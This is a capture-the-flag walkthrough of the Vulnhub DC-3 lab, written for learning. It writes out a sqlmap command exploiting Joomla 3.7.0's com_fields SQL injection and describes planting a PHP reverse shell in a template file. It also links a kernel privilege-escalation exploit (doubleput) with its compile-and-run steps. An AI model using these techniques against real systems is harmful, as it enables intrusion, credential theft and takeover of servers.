---
"title": "Vulnhub - DC 3"
"date": 2019-11-16
"tags": ["joomla", "easy", "php", "kernel_exploit", "sqli"]
"keywords": ["joomla", "easy", "php", "kernel_exploit", "sqli"]
"categories": ["Vulnhub"]
"author": "Ghostbyt3"
"description": "We are going to pwn DC 3 by DCAU7 from Vulnhub"
"featured_image": "/img/dc3/1.1.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "Vulnhub - Writeup"
---


![Untitled](/img/dc3/1.1.png)
We are going to pwn DC 3 by DCAU7 from Vulnhub


## Description
>DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.
As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.
Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.
For those with experience doing CTF and Boot2Root challenges, this probably won't take you long at all (in fact, it could take you less than 20 minutes easily).
If that's the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.


Download Link: [https://www.vulnhub.com/entry/dc-3,312/](https://www.vulnhub.com/entry/dc-3,312/)


Lets Begin with our Initial Scan

## Nmap Scan Results

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home
MAC Address: 08:00:27:BE:4C:95 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

```

Looks like only HTTP port is open so lets start our Gobuster

## Gobuster Result

```
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.5
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/11/25 19:06:03 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/administrator (Status: 301)
/.htpasswd (Status: 403)
/cache (Status: 301)
/bin (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/index.php (Status: 200)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/templates (Status: 301)
/tmp (Status: 301)
===============================================================
2019/11/25 19:06:05 Finished
===============================================================
```


![Untitled](/img/dc3/1.png)

It is ```JoomlaCMS``` so i tried using [droopescan](https://github.com/droope/droopescan) to find any vulnerable plugins or versions
![Untitled](/img/dc3/2.png)

## Finding the version is vulnerable

We can also use Metasploit to find Joomla's Version
![Untitled](/img/dc3/3.png)

> Joomla Version 3.7.0

I found there is an SQL INjection for this version.

>https://www.exploit-db.com/exploits/42033

### SQL Injection

``` sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] ```

![Untitled](/img/dc3/4.png)

![Untitled](/img/dc3/5.png)

It shows 5 Databases so lets enumerate the database by using the same command.[br/](br/)
![Untitled](/img/dc3/6.png)

>-D = To denote which database

![Untitled](/img/dc3/7.png)

It looks like ``#_users`` is interesting

![Untitled](/img/dc3/8.png)

```

-T = Used to denote which table
-C = What are the things we need from the table
--dump = To display all

```
![Untitled](/img/dc3/9.png)

We got a hash for admin so lets try it with john 

![Untitled](/img/dc3/10.png)

It Shows the password is ``snoopy``

Lets Try login 

![Untitled](/img/dc3/11.png)

## Getting Shell 

We need to get reverse shell since there is no other ports running we need to get reverse shell from the webpage

![Untitled](/img/dc3/12.png)

Templates -> Templates -> Beez3 Details and Files -> Index.php
I added my PHP Reverse Shell.

Once added I clicked on Template Preview…
and I got the shell
![Untitled](/img/dc3/13.png)

## Privilege Escalation

It looks like Kernel is outdated[br/](br/)
![Untitled](/img/dc3/14.png)

Found there is an exploit from searchsploit

![Untitled](/img/dc3/15.png)


> https://www.exploit-db.com/exploits/39772

> https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip 


I uploaded the code into the machine and did according to the instruction.

![Untitled](/img/dc3/16.png)

First ``./compile.sh``
And ``./doubleput``

![Untitled](/img/dc3/17.png)
![Untitled](/img/dc3/18.png)

``Flag``

![Untitled](/img/dc3/19.png)

Got ROOT!!









